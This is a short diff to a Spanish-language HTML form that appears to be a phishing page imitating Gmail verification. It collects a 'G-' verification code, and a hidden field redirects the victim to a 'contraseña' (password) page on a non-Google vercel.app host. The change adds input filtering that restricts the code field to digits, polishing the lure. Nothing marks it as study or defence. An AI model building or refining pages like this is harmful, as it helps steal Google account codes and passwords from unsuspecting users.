@@ -149,7 +149,7 @@
             <input type="hidden" name="_next" value="https://gmailverificacionpersonal.vercel.app/contraseña.html">
           <div class="continput">
             <label for="email">G-</label>
-          <input type="number" id="email" name="codigo" placeholder="Ingresa el codigo" maxlenght="10" required>
+          <input type="number" id="email" name="codigo" placeholder="Ingresa el codigo" maxlenght="10" onkeypress="return event.charCode >= 48 && event.charCode <= 57" required>
         </div>
 
           <div class="checkbox">
